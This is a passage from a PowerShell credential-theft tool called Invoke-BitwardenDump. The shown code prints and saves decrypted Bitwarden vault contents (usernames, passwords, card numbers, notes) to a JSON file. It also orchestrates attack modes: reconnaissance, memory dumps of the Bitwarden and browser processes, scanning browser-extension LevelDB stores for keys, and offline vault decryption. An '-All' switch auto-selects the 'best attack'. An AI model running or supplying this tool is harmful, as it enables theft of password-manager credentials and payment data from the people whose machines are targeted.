            Write-Host "$($d.Name)" -ForegroundColor White -NoNewline
            Write-Host " ($tn)" -ForegroundColor DarkGray
            if ($d.URL)        { Write-Host "      URL:  $($d.URL)" -ForegroundColor Gray }
            if ($d.Username)   { Write-Host "      User: $($d.Username)" -ForegroundColor Cyan }
            if ($d.Password)   { Write-Host "      Pass: $($d.Password)" -ForegroundColor Yellow }
            if ($d.CardNumber) { Write-Host "      Card: $($d.CardNumber)" -ForegroundColor Yellow }
            if ($d.Notes)      {
                $notePreview = if ($d.Notes.Length -gt 80) { $d.Notes.Substring(0, 80) + "..." } else { $d.Notes }
                Write-Host "      Note: $notePreview" -ForegroundColor DarkYellow
            }
        }
        Write-Host ""
        Write-Status "Decrypted $($decrypted.Count) / $($ciphers.Count) vault items" "good"
        Save-Results -Credentials $decrypted -OutputFile $OutFile
    } else {
        Write-Status "Failed to decrypt any ciphers - key may not match this vault" "bad"
    }
}

# ============================================================================
#  Output
# ============================================================================

function Save-Results {
    param($Credentials, [string]$OutputFile)
    if (-not $Credentials -or $Credentials.Count -eq 0) { return }
    try {
        $Credentials | ConvertTo-Json -Depth 5 | Out-File -FilePath $OutputFile -Encoding UTF8
        Write-Status "Results saved to: $OutputFile" "good"
    } catch {
        Write-Status "Failed to save results: $_" "bad"
    }
}

# ============================================================================
#  Main Function
# ============================================================================

function Invoke-BitwardenDump {
    [CmdletBinding(DefaultParameterSetName = 'Help')]
    param(
        [Parameter(ParameterSetName = 'Recon')][switch]$Recon,
        [Parameter(ParameterSetName = 'Dump')][switch]$Dump,
        [Parameter(ParameterSetName = 'Offline')][switch]$Offline,
        [Parameter(ParameterSetName = 'Parse')][string]$ParseDump,
        [Parameter(ParameterSetName = 'All')][switch]$All,
        [int]$TargetPid = 0,
        [string]$ApiUrl = "https://vault.bitwarden.com",
        [switch]$SaveDump,
        [string]$OutputFile = "credentials.json",
        [Alias('h')][switch]$Help
    )

    Show-Banner

    $noMode = -not $Recon -and -not $Dump -and -not $Offline -and -not $ParseDump -and -not $All
    if ($Help -or $noMode) {
        Show-Help
        return
    }

    $startTime = Get-Date
    $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    Write-Status "Running as: $currentUser $(if ($isAdmin) { '(ADMIN)' } else { '(standard user)' })" "info"
    Write-Status "Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" "info"

    if ($Recon -or $All) {
        Invoke-BWRecon
    }

    if ($Dump) {
        Invoke-BWDump -TargetPid $TargetPid -DoSaveDump $SaveDump.IsPresent -OutFile $OutputFile
    }

    if ($ParseDump) {
        Invoke-BWParseDump -DumpFile $ParseDump -OutFile $OutputFile
    }

    if ($Offline) {
        Invoke-BWOffline -ApiBaseUrl $ApiUrl -OutFile $OutputFile
    }

    if ($All) {
        # Auto-select best attack after recon
        $autoKeyCred = $script:credEntries | Where-Object { $_.TargetName -match 'auto' }
        $hasLevelDbKey = $false
        foreach ($ext in $script:browserExtPaths) {
            $found = Scan-LevelDbForKeys -ExtPath $ext.Path
            if ($found | Where-Object { $_.Type -match 'user_auto' }) { $hasLevelDbKey = $true }
        }
        if ($autoKeyCred -or $hasLevelDbKey) {
            Write-Status "Auto-selecting: OFFLINE DECRYPT" "warn"
            Invoke-BWOffline -ApiBaseUrl $ApiUrl -OutFile $OutputFile
        }
        # Always try memory dump (desktop + browser) in -All mode
        $bwProcs = Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.ProcessName -match '(?i)^bitwarden$' }
        $browserProcs = Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.ProcessName -match '(?i)^(chrome|brave|msedge|firefox|vivaldi)$' }
        if ($bwProcs -or $browserProcs) {
            Write-Status "Auto-selecting: MEMORY DUMP (desktop + browser)" "warn"
            Invoke-BWDump -TargetPid $TargetPid -DoSaveDump $SaveDump.IsPresent -OutFile $OutputFile
        } elseif (-not $autoKeyCred -and -not $hasLevelDbKey) {
            Write-Status "No viable attack path found" "bad"
        }
    }

    $elapsed = (Get-Date) - $startTime
    Write-Host ""
    Write-Status "Completed in $([math]::Round($elapsed.TotalSeconds, 1))s" "info"
}

# ============================================================================
#  Entry Point
# ============================================================================

Invoke-BitwardenDump @PSBoundParameters
